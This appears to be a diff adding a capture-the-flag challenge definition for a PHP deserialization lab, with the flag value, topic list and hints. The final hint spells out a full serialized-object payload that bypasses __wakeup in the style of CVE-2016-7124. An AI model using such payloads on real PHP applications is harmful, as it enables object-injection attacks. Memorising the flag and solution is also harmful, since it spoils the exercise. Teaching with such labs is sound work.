@@ -1,0 +1,25 @@
+{
+  "id": "unser1",
+  "category": "unser",
+  "title": "会员礼盒激活器 · PHP __wakeup 绕过",
+  "difficulty": "easy",
+  "difficulty_level": 2,
+  "url_path": "/unser1",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{unser1_702346b8}",
+  "knowledge": [
+    "PHP 序列化格式（O:/s:/i: 语法）",
+    "魔术方法生命周期 __wakeup/__destruct",
+    "CVE-2016-7124 历史与 PHP8 现代形态",
+    "wakeup 异常中断 → 已构造内层对象析构仍触发"
+  ],
+  "hints": [
+    "先用实验区的正常卡（等级 5）激活试试：wakeup 校验通过后会把 gift 的 level 归零，所以拿不到奖品。降级发生在 wakeup 里——想办法让 wakeup 走不到降级那一行。",
+    "wakeup 第一行：属性数量 ≠ 2 会 throw。往序列化串里多塞一个属性（CVE-2016-7124 的经典 payload 形状）让校验抛异常：unserialize 失败了，但内层 Gift 对象已构造完成，PHP 回收内存时它的 __destruct 照样执行且 level 未被归零。",
+    "完整 payload：O:7:\"GiftBox\":3:{s:4:\"gift\";O:4:\"Gift\":3:{s:4:\"name\";s:6:\"hacker\";s:5:\"level\";i:5;s:5:\"prize\";s:8:\"flag.php\";}s:3:\"sig\";s:10:\"GIFTBOX_V1\";s:1:\"x\";i:1;} —— 属性个数写 3 并补第三个属性 x。"
+  ],
+  "writeup": "writeup.md",
+  "prev": null,
+  "next": "unser2"
+}
